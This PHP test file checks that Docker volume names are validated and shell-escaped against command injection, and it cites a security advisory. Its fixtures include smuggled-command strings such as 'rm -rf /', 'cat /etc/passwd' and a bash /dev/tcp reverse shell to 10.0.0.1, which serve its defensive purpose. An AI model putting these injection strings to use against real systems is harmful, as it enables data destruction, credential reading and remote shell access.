<?php

/**
 * Persistent Volume Security Tests
 *
 * Tests to ensure persistent volume names are validated against command injection
 * and that shell commands properly escape volume names.
 *
 * Related Advisory: GHSA-mh8x-fppq-cp77
 * Related Files:
 *  - app/Models/LocalPersistentVolume.php
 *  - app/Support/ValidationPatterns.php
 *  - app/Livewire/Project/Service/Storage.php
 *  - app/Actions/Service/DeleteService.php
 */

use App\Support\ValidationPatterns;

// --- Volume Name Pattern Tests ---

it('accepts valid Docker volume names', function (string $name) {
    expect(preg_match(ValidationPatterns::VOLUME_NAME_PATTERN, $name))->toBe(1);
})->with([
    'simple name' => 'myvolume',
    'with hyphens' => 'my-volume',
    'with underscores' => 'my_volume',
    'with dots' => 'my.volume',
    'with uuid prefix' => 'abc123-postgres-data',
    'numeric start' => '1volume',
    'complex name' => 'app123-my_service.data-v2',
]);

it('rejects volume names with shell metacharacters', function (string $name) {
    expect(preg_match(ValidationPatterns::VOLUME_NAME_PATTERN, $name))->toBe(0);
})->with([
    'semicolon injection' => 'vol; rm -rf /',
    'pipe injection' => 'vol | cat /etc/passwd',
    'ampersand injection' => 'vol && whoami',
    'backtick injection' => 'vol`id`',
    'dollar command substitution' => 'vol$(whoami)',
    'redirect injection' => 'vol > /tmp/evil',
    'space in name' => 'my volume',
    'slash in name' => 'my/volume',
    'newline injection' => "vol\nwhoami",
    'starts with hyphen' => '-volume',
    'starts with dot' => '.volume',
]);

// --- escapeshellarg Defense Tests ---

it('escapeshellarg neutralizes injection in docker volume rm command', function (string $maliciousName) {
    $command = 'docker volume rm -f '.escapeshellarg($maliciousName);

    // The command should contain the name as a single quoted argument,
    // preventing shell interpretation of metacharacters
    expect($command)->not->toContain('; ')
        ->not->toContain('| ')
        ->not->toContain('&& ')
        ->not->toContain('`')
        ->toStartWith('docker volume rm -f ');
})->with([
    'semicolon' => 'vol; rm -rf /',
    'pipe' => 'vol | cat /etc/passwd',
    'ampersand' => 'vol && whoami',
    'backtick' => 'vol`id`',
    'command substitution' => 'vol$(whoami)',
    'reverse shell' => 'vol$(bash -i >& /dev/tcp/10.0.0.1/8888 0>&1)',
]);

// --- volumeNameRules Tests ---

it('generates volumeNameRules with correct defaults', function () {
    $rules = ValidationPatterns::volumeNameRules();

    expect($rules)->toContain('required')
        ->toContain('string')
        ->toContain('max:255')
        ->toContain('regex:'.ValidationPatterns::VOLUME_NAME_PATTERN);
});

it('generates nullable volumeNameRules when not required', function () {
    $rules = ValidationPatterns::volumeNameRules(required: false);

    expect($rules)->toContain('nullable')
        ->not->toContain('required');
});

it('generates correct volumeNameMessages', function () {
    $messages = ValidationPatterns::volumeNameMessages();

    expect($messages)->toHaveKey('name.regex');
});

it('generates volumeNameMessages with custom field name', function () {
    $messages = ValidationPatterns::volumeNameMessages('volume_name');

    expect($messages)->toHaveKey('volume_name.regex');
});
